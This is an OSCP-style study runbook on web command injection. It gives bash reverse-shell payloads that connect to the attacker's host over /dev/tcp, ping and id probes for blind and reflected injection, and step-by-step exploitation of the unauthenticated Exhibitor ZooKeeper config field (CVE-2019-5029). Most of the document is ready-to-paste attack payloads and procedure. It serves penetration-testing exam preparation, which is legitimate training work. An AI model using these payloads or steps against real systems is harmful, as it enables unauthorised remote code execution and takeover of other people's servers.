---
tags: [oscp, web-app, command-injection, runbook]
box_sources: [Pelican]
---

# Web App — Command Injection

*A web app field or parameter gets passed to a shell. Goal: inject a reverse shell.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| Paste `$(/bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &)` into the field and submit | Shell received on listener | Field content is executed as a shell script (e.g. Exhibitor `java.env script`) | `$()` triggers command substitution. `&` backgrounds it so the app doesn't hang. Listener must be running first. | [[Shell - Upgrade]] | Try `;bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &` — some contexts need a semicolon rather than `$()` |
| Paste `$(ping -c 1 $LocalIP)` and watch tcpdump | ICMP ping received on Kali | Test for blind injection before going for a shell | `sudo tcpdump -i tun0 icmp` on Kali. If you see the ping, code exec is confirmed — now go for the shell. | Build the reverse shell | Field is sanitised — try URL encoding or other bypass |
| Try `;id` or `|id` appended to a field value | `uid=...` in response | Reflected command injection in a web form or URL parameter | If the output comes back in the page, it's reflected CI. If not, it's blind — use the ping test. | [[Shell - Upgrade]] | [[HTTP - Directory Brute]] for other entry points |

---

## Exhibitor UI (ZooKeeper) — Specific Notes

The **Exhibitor for ZooKeeper** admin UI (commonly port 8080) has a **Config tab** with a `java.env script` field. This field is written verbatim into a shell script and executed with no sanitisation. No authentication is required on default installs.

**Exact exploit steps:**
1. Browse to `http://$BoxIP:8080/exhibitor/v1/ui/index.html`
2. Click **Config** tab
3. Paste payload into **`java.env script`** field
4. Click **Commit ZooKeeper Config**
5. Shell fires immediately

**Payload:**
```
$(/bin/bash -i >& /dev/tcp/$LocalIP/$Port 0>&1 &)
```

**CVE reference:** Commonly referenced as CVE-2019-5029 (Exhibitor unauth RCE). Affects Exhibitor versions prior to patching — common in older ZooKeeper deployments.

---

## Blind vs Reflected

| Type | Behaviour | Detection |
|---|---|---|
| Reflected | Output appears in the HTTP response | Add `; echo INJECTED` — look in page source |
| Blind | Output goes nowhere visible | Ping test via tcpdump |
| OOB | Output sent to external server | Use Burp Collaborator or `curl $LocalIP` |

---

## Screenshot Prompt

> 📸 After identifying the injection field: `shot <service>-<finding>` (e.g. `shot http-exhibitor-config`)
> 📸 After shell is received: `shot foothold`

---

**Module:** [[09. Common Web Application Attacks|Common Web Application Attacks]]
